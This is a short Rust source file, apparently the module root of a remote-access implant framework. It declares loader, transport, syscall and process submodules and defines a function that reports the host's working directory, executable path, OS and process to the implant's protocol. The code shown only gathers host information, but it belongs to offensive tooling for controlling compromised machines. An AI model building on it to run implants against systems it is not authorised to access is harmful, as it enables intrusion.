use std::env;

pub mod filesys;
pub mod memory;
pub mod syscall;
pub mod sysinfo;
pub mod transport;
pub mod process;
pub mod net;
pub mod hot_modules;
pub mod loader;


pub fn get_sysinfo() -> crate::protobuf::implantpb::SysInfo {
    crate::protobuf::implantpb::SysInfo {
        workdir: filesys::get_cwd().unwrap_or_else(|e| e.to_string()),
        filepath: filesys::get_executable_path().unwrap_or_else(|e| e.to_string()),
        os: sysinfo::default_os(),
        process: process::default_process()
    }
}